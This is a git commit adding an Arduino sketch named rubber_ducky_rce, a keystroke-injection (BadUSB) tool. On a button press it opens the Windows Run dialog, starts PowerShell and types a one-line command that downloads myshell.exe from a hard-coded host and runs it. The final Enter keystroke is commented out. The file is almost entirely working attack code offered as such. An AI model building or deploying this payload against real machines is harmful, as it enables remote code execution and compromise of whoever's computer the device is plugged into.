f50e344fecfa259265adb3cb575a9e2c98e16c5d
Diego Joel Condori Quispe <93290842+diegojoel301@users.noreply.github.com>
2022-04-09 07:31:14 +0200

    Add files via upload

---
+++ rubber_ducky_rce/rubber_ducky_rce.ino
@@ -0,0 +1,49 @@
+#include<Keyboard.h>
+
+const int buttonPin = 2;          // Pin del boton
+int previousButtonState = HIGH;   // Estado del boton
+int counter = 0;                  // Contador del boton por cada pulsp
+int check = 0;
+
+String direccion = "192.168.1.1";
+
+void typeKey(uint8_t key)
+{
+  Keyboard.press(key);
+  delay(50);
+  Keyboard.release(key);
+}
+
+void setup()
+{
+  pinMode(buttonPin, INPUT);
+  Keyboard.begin();  
+}
+
+void loop()
+{
+  int buttonState = digitalRead(buttonPin);
+  
+  if ((buttonState != previousButtonState) && (buttonState == HIGH))
+  {
+    delay(500);
+
+    Keyboard.press(KEY_LEFT_GUI);
+    Keyboard.press('r');
+    Keyboard.releaseAll();
+  
+    delay(500);
+    Keyboard.print("powershell");
+    typeKey(KEY_RETURN);
+  
+    delay(500);
+  
+    Keyboard.print("cd ~/");
+    typeKey(KEY_RETURN);
+    
+    delay(500);
+    Keyboard.print("(new-object System.Net.WebClient).DownloadFile('http://" + direccion + "/myshell.exe', 'myshell.exe'); Start-Process \"myshell.exe\" ");
+    //typeKey(KEY_RETURN);
+  }
+  previousButtonState = buttonState;
+}
